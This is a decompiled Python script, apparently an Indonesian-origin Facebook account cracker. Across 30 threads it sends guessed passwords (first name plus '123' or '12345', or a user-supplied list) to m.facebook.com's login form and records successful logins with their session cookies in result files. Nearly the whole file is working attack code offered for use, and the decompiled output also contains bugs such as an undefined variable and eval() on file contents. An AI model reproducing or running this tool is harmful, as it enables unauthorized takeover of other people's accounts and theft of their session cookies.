# Filenames : 
# Python bytecode : 3.8
# Time succses decompiled Sat Sep 26 03:45:35 2020
# Selector <module> in line 6 file 
# Timestamp in code : 2020-06-27 04:07:18

import os, json, requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
ses = requests.Session()
penghitung = ''
H = '\x1b[32;m'
K = '\x1b[33;m'
n = '\x1b[0m'
total_user = None
count = 0
life = []
chek = []
alive = 0
check = 0
die = 0
skip = 0
cheker_alive = []
cheker_check = []
try:
    ua = requests.get('https://api-asutoolkit.cloudaccess.host/useragent.txt').text.strip()
except requests.exceptions.ConnectionError:
    exit('  { ! } Bad connection')
else:

    def checker(users):
        global cheker_alive
        global cheker_check
        [login((user['username']), (username['password']), cek=True) for user in users]
        if cheker_alive != 0:
            with open('results-alive', 'w') as f:
                f.write(str(cheker_alive))
        if cheker_check != 0:
            with open('results-check', 'w') as f:
                f.write(str(cheker_check))


    def sorting(users):
        global alive
        global check
        global total_user
        total_user = str(len(users))
        with ThreadPoolExecutor(max_workers=30) as ex:
            print('\n        Select Method Password')
            print('\n     { 1 } Set manually password to crack')
            print('     { 2 } Auto crack with pass: name123, name12345')
            choice = input('\n     { ? } Select: ')
            if choice == '1':
                print('     { ! } Example: zett123, zett1234,zett ganteng, etc.')
                listpass = input('     { ? } Set password: ').split(',')
                print('\n  { ! } Crack started')
                print('  { ! } Results will be saved in results-alive and results-check')
                print()
                for user in users:
                    username = user['username']
                    for passw in listpass:
                        ex.submit(login, username, passw)

            elif choice in ('', '2'):
                print('\n  { ! } Crack started')
                print('  { ! } Results will be saved in results-alive and results-check')
                print()
                for user in users:
                    name, username = user['name'], user['username']
                    ss = name.split(' ')
                    if len(ss) == 1:
                        pass1 = ss[0] + '123'
                        pass2 = ss[0] + '12345'
                    elif len(ss) == 2:
                        pass1 = ss[0] + '123'
                        pass2 = ss[0] + '12345'
                    elif len(ss) == 3:
                        pass1 = ss[0] + '123'
                        pass2 = ss[0] + '12345'
                    else:
                        pass1 = 'doraemon'
                        pass2 = 'minions'
                    listpass = [pass1,
                     pass2]
                    for passw in listpass:
                        ex.submit(login, username, passw)

        if check != 0 or alive != 0:
            print()
            print('\n  { ! } Done. file saved in : ')
            print('        - life : results-life.txt')
            print('        - checkpoint : results-check.txt')
            exit('  { ! } thanks for using this tools')
        else:
            print()
            print('\n  { ! } Done')
            exit('  { ! } no result')


    def login(username, password, cek=False):
        global alive
        global check
        global count
        global penghitung
        form = {}
        if penghitung != username:
            penghitung = username
            count += 1
        ses = requests.Session()
        ses.headers.update({'origin':'https://m.facebook.com', 
         'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
         'content-type':'application/x-www-form-urlencoded', 
         'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
         'cache-control':'max-age=0', 
         'upgrade-insecure-requests':'1', 
         'host':'m.facebook.com', 
         'accept-encoding':'gzip, deflate', 
         'save-data':'on', 
         'user-agent':ua})
        blacklist = [
         'sign_up',
         '_fb_noscript']
        data = ses.get('https://m.facebook.com/', verify=False)
        cookies = ';'.join([f"{key}={value}" for key, value in data.cookies.get_dict().items()])
        ses.headers.update({'cookie': cookies})
        login = BeautifulSoup(data.content, 'html.parser').find('form')['action']
        for i in BeautifulSoup(data.content, 'html.parser')('input'):
            try:
                if i['name'] not in blacklist:
                    form[i['name']] = i['value']
            except KeyError:
                if 'email' == i['name']:
                    form[i['name']] = username
                elif 'pass' == i['name']:
                    form[i['name']] = password

        else:
            form.update({'prefill_contact_point':'', 
             'prefill_source':'', 
             'prefill_type':'', 
             'first_prefill_source':'', 
             'first_prefill_type':'', 
             'had_cp_prefilled':'false', 
             'had_password_prefilled':'false', 
             'is_smart_lock':'false', 
             '_fb_noscript':'true'})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            data = ses.post(('https://m.facebook.com' + login), data=form, verify=False)
            if 'manual_redirect' in str(data.content):
                ses.headers.update({'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&refid=8'})
                data = ses.post((BeautifulSoup(data.content, 'html.parser').find('a', href=True)['href']),
                  data=form,
                  verify=False)
            if 'c_user' in str(data.cookies):
                cookies = ';'.join([f"{key}={value}" for key, value in data.cookies.get_dict().items()])
                print(f"\r{n}  [{H}ALIVE{n}] {username} -> {password}                ", end='')
                print('')
                alive += 1
                result = {'username':'%s',  'password':'%s',  'cookie':'%s'} % (
                 username,
                 password,
                 cookies)
                if cek:
                    cheker_alive.append(result)
                if os.path.exists('results-alive'):
                    files = eval(open('results-alive').readlines())
                    files.append(result)
                else:
                    files = [
                     result]
                with open('results-alive', 'w') as f:
                    f.write(str(files))
            elif 'checkpoint' in str(data.cookies):
                cookies = ';'.join([f"{key}={value}" for key, value in data.cookies.get_dict().items()])
                print(f"\r  {n}[{K}CHECK{n}] {username} -> {password}               ", end='')
                print('')
                result = "{'username':'%s','password':'%s','cookie':'%s'}" % (
                 username,
                 password,
                 cookies)
                if cek:
                    cheker_check.append(result)
                with open('results-check', 'a') as f:
                    f.write(result + ',')
                check += 1
                if os.path.exists('results-check'):
                    files = eval(open('results-check').readlines())
                    files.append(result)
                else:
                    files = [
                     result]
                with open('results-check', 'w') as f:
                    f.write(str(files))
            print(f"\r  [CRACK] {str(count)}/{total_user} - alive-:{str(alive)} - check-:{str(check)}        ",
              end='')


# global chek ## Warning: Unused global
# global die ## Warning: Unused global
# global life ## Warning: Unused global


